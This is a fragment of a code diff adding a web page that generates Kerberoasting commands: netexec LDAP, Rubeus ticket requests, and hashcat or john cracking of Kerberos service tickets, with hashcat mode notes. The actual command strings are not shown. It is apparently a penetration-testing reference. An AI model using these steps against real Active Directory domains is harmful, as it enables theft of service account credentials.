+    cmdBlockHTML('netexec (nxc) LDAP', 'linux', nxcLdap),
+    cmdBlockHTML('Rubeus kerberoast', 'windows', rubeus,
+      '<strong>Note:</strong> Run on domain-joined Windows host. Outputs RC4/AES encrypted service tickets.'),
+    cmdBlockHTML('hashcat — crack TGS (RC4)', 'linux', hashcat,
+      '<strong>Mode -m 13100:</strong> Kerberos 5 TGS-REP etype 23 (RC4-HMAC). Use -m 19600 for AES-128, -m 19700 for AES-256.'),
+    cmdBlockHTML('john — crack TGS', 'linux', john),
+  ]);
+}
+
+/* ── Init ───────────────────────────────────────────────────────────────────── */
+rebuild();
+</script>
+</body>
+</html>
